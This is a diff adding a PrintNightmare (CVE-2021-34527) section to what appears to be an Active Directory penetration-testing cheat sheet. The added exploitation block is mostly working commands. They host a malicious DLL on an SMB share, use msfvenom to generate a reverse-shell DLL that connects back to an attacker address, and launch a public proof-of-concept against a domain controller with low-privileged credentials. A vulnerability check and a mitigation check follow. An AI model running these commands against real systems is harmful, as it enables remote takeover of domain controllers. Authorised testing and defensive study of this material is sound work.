@@ -220,6 +220,35 @@ nxc smb 10.10.10.10 -u lowpriv -p 'Password123!' -M dnsadmin -o SERVER=DC01 DLL=
 
 ---
 
+## 7. PrintNightmare — Remote Code Execution on DCs (CVE-2021-34527)
+
+**Scope:** Remote code execution against any Windows host with Print Spooler running (including Domain Controllers). While also usable as local privilege escalation (covered in `easy-lpe-cve-quickhits.md`), the RCE vector is the AD-relevant attack — execute code on a DC remotely with low-privileged domain credentials.
+
+**Affected versions:** Windows Server 2012–2022, Windows 8.1–11 (unpatched, Print Spooler running)
+
+**Exploitation:**
+```bash
+# Host a malicious DLL on an SMB share (attacker box)
+impacket-smbserver share /tmp/payloads -smb2support
+# Generate payload DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o /tmp/payloads/evil.dll
+
+# Fire the exploit (cube0x0 PoC)
+python3 CVE-2021-1675.py domain.local/user:pass@<DC_IP> '\\<ATTACKER_IP>\share\evil.dll'
+```
+
+**Check if vulnerable:**
+```bash
+rpcdump.py @<DC_IP> | grep -i "MS-RPRN\|MS-PAR"     # Print Spooler RPC interfaces
+# If MS-RPRN is present, the Spooler is running and potentially vulnerable
+```
+
+**Mitigation check:** `Get-Service Spooler` — if Spooler is stopped/disabled, the attack surface is removed.
+
+**Reference:** https://github.com/cube0x0/CVE-2021-1675
+
+---
+
 ## Cleanup / OPSEC checklist
 
 - **ZeroLogon:** restore the DC machine account password (Section 1, Step 4) before ending the engagement session — non-negotiable, this one breaks the DC if skipped.
